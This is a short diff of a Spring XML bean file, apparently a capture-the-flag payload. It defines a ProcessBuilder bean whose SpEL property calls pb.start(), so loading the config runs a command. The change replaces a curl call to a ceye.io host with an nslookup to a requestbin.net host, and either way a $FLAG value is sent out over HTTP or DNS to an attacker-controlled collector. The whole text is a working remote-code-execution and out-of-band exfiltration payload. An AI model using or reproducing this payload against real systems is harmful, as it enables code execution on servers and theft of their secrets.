@@ -7,8 +7,8 @@
   <bean id="pb" class="java.lang.ProcessBuilder">
      <constructor-arg>
         <list>
-            <value>curl</value>
-            <value>$FLAG.zg80gf.ceye.io/</value>
+            <value>nslookup</value>
+            <value>$FLAG.e2edbade6522868f09a3.d.requestbin.net/</value>
         </list>
     </constructor-arg>
      <property name="whatever" value="#{ pb.start() }"/>
